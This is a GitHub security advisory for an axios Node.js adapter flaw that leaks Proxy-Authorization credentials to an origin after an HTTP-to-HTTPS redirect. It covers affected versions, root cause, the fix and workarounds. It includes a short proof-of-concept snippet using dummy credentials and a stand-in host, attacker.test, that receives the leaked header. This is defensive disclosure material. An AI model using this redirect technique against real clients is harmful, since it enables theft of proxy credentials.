# [H] Axios: Proxy-Authorization Credential Leak to Origin Server Across HTTP-to-HTTPS Redirect in Axios Node.js HTTP Adapter

## Summary
Severity: High
Advisory: GHSA-p92q-9vqr-4j8v
CVE: CVE-2026-44487
CWE: CWE-201
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-p92q-9vqr-4j8v
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.16.0
- npm: `axios` — affected >=0 <0.32.0

## Details
## Summary

Axios’s Node.js HTTP adapter may forward a `Proxy-Authorization` header to a redirected origin during specific proxy-to-direct redirect flows.

This affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy.

## Impact

A malicious or attacker-controlled origin can cause an axios client to disclose its configured proxy credentials if all required conditions are present.

The leak is limited to Node.js HTTP adapter requests. Browser, XHR, fetch, and React Native adapter paths are not affected by this Node-specific proxy handling path.

The practical impact depends on the leaked credentials. If the credential is reusable and the proxy is reachable by the attacker, the attacker may be able to authenticate to that proxy, subject to the proxy’s own network exposure, authorisation policy, and credential scope.

## Affected Functionality

Affected functionality requires all of the following:

- Axios running in Node.js with the HTTP adapter.
- An initial `http://` request using an authenticated proxy from `config.proxy` or proxy environment variables.
- Redirect following enabled.
- A redirect target for which no proxy applies, such as no matching `HTTPS_PROXY` or a matching `NO_PROXY`.
- A redirect shape treated as same-host or otherwise not stripped by the redirect layer’s confidential-header handling.

Unaffected functionality includes browser adapters, requests with `maxRedirects: 0`, requests without proxy credentials, and redirect flows where the redirect layer strips `Proxy-Authorization` before axios reconfigures the redirected request.

## Technical Details

In affected versions, `lib/adapters/http.js` adds `Proxy-Authorization` in `setProxy()` when a proxy with credentials is used.

Axios also installs redirect proxy handling so redirected requests can re-run proxy resolution. Before the fix, when the redirected request no longer resolved to a proxy, `setProxy()` did not clear a `Proxy-Authorization` header inherited from the previous request options. If `follow-redirects` did not remove that header for the specific redirect shape, the redirected direct request carried the stale proxy credential to the origin.

The `1.x` fix in commit `afca61a` changes `setProxy(options, configProxy, location, isRedirect)` so redirect re-invocation removes every case variant of `Proxy-Authorization` before applying proxy settings for the next hop. Regression tests in `tests/unit/adapters/http.test.js` cover no-proxy redirects, `NO_PROXY`, different proxy targets, casing variants, and an end-to-end redirect flow.

The `0.x` fixed release `0.32.0` includes a backport-style `removeProxyAuthorization()` guard in `lib/adapters/http.js`.

## Proof of Concept of Attack

Safe local outline using dummy credentials:

```js
process.env.HTTP_PROXY = 'http://user:pass@127.0.0.1:8080';
delete process.env.HTTPS_PROXY;

// The local HTTP proxy receives this request and returns:
// HTTP/1.1 302 Found
// Location: https://attacker.test/final
await axios.get('http://attacker.test/start');
```

Expected vulnerable behaviour:

```text
Proxy receives initial request:
Proxy-Authorization: Basic dXNlcjpwYXNz

Final HTTPS origin receives redirected request:
Proxy-Authorization: Basic dXNlcjpwYXNz
```

Expected fixed behaviour:

```text
Final HTTPS origin receives no Proxy-Authorization header.
```

## Workarounds

Set `maxRedirects: 0` and handle redirects manually, ensuring `Proxy-Authorization` is not copied to requests that are not sent through the proxy.

Avoid using reusable authenticated HTTP proxy credentials for requests to untrusted origins. If exposure is suspected, rotate the proxy credential.


<details>
<summary>Original Source</summary>

### Summary

Axios’s Node.js `http` adapter can incorrectly forward a retained `Proxy-Authorization` header to the final HTTPS origin during certain HTTP-to-HTTPS redirect flows.

When an initial HTTP request is sent through an authenticated `HTTP_PROXY`, and the redirected HTTPS request is sent directly because no proxy applies to the redirected HTTPS URL, Axios retains the stale `Proxy-Authorization` header and forwards it to the final origin.

### Details

The issue occurs during a proxy-to-direct transition across redirects.

When Axios sends an initial HTTP request through an authenticated `HTTP_PROXY`, it correctly includes `Proxy-Authorization` for the proxy hop. If that response redirects to an HTTPS URL on the same hostname, and no proxy applies to the redirected HTTPS URL, the redirected request is sent directly to the final origin instead of through the proxy.

In the affected flow, the final HTTPS origin receives a `Proxy-Authorization` header value that was intended only for the outbound proxy.

Whether the issue is observable depends on how the redirect layer compares the host and port across the redirect. In the affected redirect shape, confidential-header handling does not remove the retained `Proxy-Authorization` header before the redirected request is sent.

#### Root Cause Analysis

Based on code review, Axios appears to create the stale header condition in its Node.js `http` adapter.

In lib/adapters/http.js:
- When a proxy is used, Axios adds `Proxy-Authorization` in setProxy().
- Axios also re-runs proxy resolution after redirects via its redirect hook.
- However, when the redirected request no longer uses a proxy, Axios does not explicitly clear a previously set Proxy-Authorization header.

As a result, Axios correctly adds proxy credentials for the first proxied request, but does not clear them when a later redirected request becomes direct.

A dependent factor is the behavior of the redirect layer. In the affected redirect shape, confidential-header handling does not remove the retained `Proxy-Authorization` header before the redirected request is sent. This appears to be why the issue is observable only for certain redirect shapes.

#### Client Conditions
- the initial HTTP request uses an authenticated `HTTP_PROXY`
- no proxy applies to the redirected HTTPS URL (for example, no `HTTPS_PROXY` is configured)
- redirects are followed
- the redirect is treated as same-host by the redirect layer

Under that redirect shape, the retained `Proxy-Authorization` header is not removed before the redirected request is sent to the final HTTPS origin.

### Reproduction Outline

Detailed reproduction instructions were shared with the maintainers during coordinated disclosure. The public outline below preserves the validated configuration and observable behavior needed to assess exposure, while omitting environment-specific test-harness details.

The issue was reproduced only in a researcher-controlled local test environment using dummy proxy credentials.

The issue was confirmed under the following conditions:

- axios 1.13.6
- follow-redirects 1.15.11
- an authenticated proxy applying to the initial HTTP request
- no proxy applying to the redirected HTTPS URL
- redirects enabled
- an HTTP-to-HTTPS redirect that is treated as same-host by the redirect layer

#### Observed behavior

- The initial HTTP request is sent through the proxy and includes `Proxy-Authorization`.
- The redirected HTTPS request is sent directly to the final origin.
- The redirected HTTPS request still includes the previously generated `Proxy-Authorization` header.
- The final origin can receive a `Proxy-Authorization` header value that was intended only for the proxy.

#### Expected behavior

Axios should not send the `Proxy-Authorization` header on a redirected request that is no longer sent through a proxy.

### Impact

Under the affected redirect and proxy configuration, the final HTTPS origin may receive a retained `Proxy-Authorization` header value that was intended only for the outbound proxy.

If that credential is valid and reusable, and the outbound proxy is reachable by the attacker, the attacker may be able to authenticate to that proxy with the affected environment’s proxy credential, subject to the credential’s scope and the proxy’s access controls.
</details>

---

## References
- https://github.com/axios/axios/security/advisories/GHSA-p92q-9vqr-4j8v
- https://nvd.nist.gov/vuln/detail/CVE-2026-44487
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v0.32.0
- https://github.com/axios/axios/releases/tag/v1.16.0
